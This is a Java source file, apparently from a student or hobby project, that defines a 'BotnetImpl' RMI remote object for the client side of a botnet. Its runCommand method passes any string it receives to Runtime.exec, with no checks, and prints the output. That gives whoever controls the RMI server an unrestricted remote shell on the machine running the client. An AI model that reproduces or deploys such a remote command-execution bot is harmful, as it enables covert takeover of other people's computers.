/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package client;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.logging.Level;
import java.util.logging.Logger;
import model.Botnet;
import rmi.IBotnet;

/**
 *
 * @author haiclover
 */
public class BotnetImpl extends UnicastRemoteObject implements IBotnet{

    public BotnetImpl() throws RemoteException {
    }
    
    @Override
    public Botnet getBotnet() throws RemoteException {
        Botnet b = new Botnet();
        return b;
    }
    
    public void testing() throws RemoteException {
        System.out.println("This is running on client");
    }
    
    public void runCommand(String cmd) throws RemoteException {
        Process process;
        try {
            process = Runtime.getRuntime().exec(cmd);
            BufferedReader result = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String s = null;
            while ((s = result.readLine()) != null) {
                System.out.println(s);
            }
        } catch (IOException ex) {
            Logger.getLogger(BotnetImpl.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
}
